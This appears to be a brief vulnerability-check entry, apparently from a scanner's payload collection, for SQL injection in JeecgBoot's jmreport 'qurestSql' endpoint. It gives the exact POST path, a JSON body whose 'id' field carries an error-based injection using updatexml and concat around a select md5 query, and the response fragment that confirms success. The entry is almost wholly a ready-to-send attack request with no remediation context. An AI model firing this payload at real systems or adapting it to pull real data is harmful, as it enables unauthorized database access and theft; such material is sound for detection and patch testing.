# jeecg-boot-sqli

jeecg-boot-sqli ｜ 其他 ｜ —
- **请求**：`POST /jeecg-boot/jmreport/qurestSql HTTP/1.1`

**Payload**
```
{"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
```
- **响应特征**：200 49ba59abbe56e057